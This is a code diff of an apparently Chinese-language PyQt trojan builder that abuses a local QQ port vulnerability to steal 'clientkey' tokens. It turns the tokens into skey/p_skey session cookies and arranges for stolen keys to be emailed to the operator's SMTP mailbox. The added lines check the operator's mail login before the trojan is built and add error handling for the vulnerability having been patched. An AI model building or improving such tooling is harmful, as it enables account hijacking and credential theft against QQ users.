@@ -16,6 +16,7 @@ import sys
 import base64
 import dns.resolver
 import traceback
+from smtplib import SMTP,SMTPAuthenticationError,SMTPServerDisconnected
 
 def encrypt(fpath: str, algorithm: str) -> str:
     with open(fpath, 'rb') as f:
@@ -52,6 +53,7 @@ class Ui_Dialog(object):
         self.mail_url = ''
         self.icon_path = ''
         self.file_path = ''
+        self.flag = '' # 在生成木马发现错误后退出返回并将此项设置为对应的密码,下一次就可以直接生成
         Dialog.setObjectName("Dialog")
         Dialog.resize(701, 463)
         font = QtGui.QFont()
@@ -145,6 +147,8 @@ class Ui_Dialog(object):
         self.textEdit.setReadOnly(True)
         self.textEdit.setObjectName("textEdit")
         self.textEdit.textChanged.connect(lambda: self.textEdit.moveCursor(11))
+        self.textEdit.setLineWrapMode(QtWidgets.QTextEdit.NoWrap)
+        self.textEdit.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOn)
         self.label_7 = QtWidgets.QLabel(Dialog)
         self.label_7.setGeometry(QtCore.QRect(310, 11, 171, 21))
         font = QtGui.QFont()
@@ -401,7 +405,9 @@ class Ui_Dialog(object):
 [Warning]未获取到clientkey,说明您的QQ还未生成clientkey,请尝试稍等30~60秒后重启工具获取!
 uin={uin}
 nickname={nickname}
-******************感谢使用******************""")
+******************感谢使用******************""",end='')
+                self.func_running = False
+                return
             else:
                 print(f"[+] clientkey={clientkey}")
         except requests.exceptions.ConnectionError as e:
@@ -409,6 +415,8 @@ nickname={nickname}
                 print(f"[ERROR] 连接失败,请检查您的QQ版本是否为9.7.2x/4301端口是否被占用,若是则说明无法使用!")
             elif "10061" in e.__str__(): # 10061则代表端口未开放
                 print(f"[ERROR] 连接失败,请检查是否开启QQ!")
+            elif "11004" in e.__str__(): # 访问地址被映射到一个无效的地址(如0.0.0.0)
+                print(f"[ERROR] 连接失败,疑似漏洞已被修复,请到QQkey漏洞修复器恢复!")
             else:
                 print(f"[ERROR] 连接失败,原因:\n{e}")
             self.func_running = False
@@ -493,7 +501,6 @@ nickname={nickname}
             qun_res = session.get("https://ssl.ptlogin2.qq.com/jump", params=qun_params, cookies=qun_cookies,
                                   headers=headers)
             qun_url = extractor.find_urls(qun_res.text)[0]
-            qun_cookie = requests.utils.dict_from_cookiejar(qun_res.cookies)
             qun_info_cookies = session.get(qun_url, allow_redirects=False).cookies
             qun_skey = qun_info_cookies.get("skey")
             qun_pskey = qun_info_cookies.get("p_skey")
@@ -579,6 +586,24 @@ nickname={nickname}
                     return
                 print("选择成功!当前smtp服务器为:"+smtp_server[1:-1])
                 self.lineEdit.setText(smtp_server[1:-1])
+            if self.flag != self.lineEdit_4.text()[1:-1]:
+                print("开始验证邮箱密码是否正确...")
+                try:
+                    server = SMTP(smtp_server[1:-1], smtp_port)
+                    server.starttls()
+                    server.login(smtp_account[1:-1], smtp_password[1:-1])
+                    print("验证成功!")
+                    self.flag = ""
+                    server.quit()
+                except (SMTPAuthenticationError, SMTPServerDisconnected):
+                    print("验证失败,请检查邮箱密码是否正确,")
+                    print("如果您是如网易邮箱或QQ邮箱等需要授权码的邮箱,请使用授权码当做密码,而不是登录密码!")
+                    print("若想无视风险继续生成请再次点击生成以忽视风险")
+                    self.func_running = False
+                    self.flag = self.lineEdit_4.text()[1:-1]
+                    return
+            else:
+                print("Warning:当前邮箱密码未更改,将忽略因密码有误而无法收Key风险!")
             zip_path = '.\\Tools.zip'
             # 文件存储路径
             if not os.path.isdir('data'):
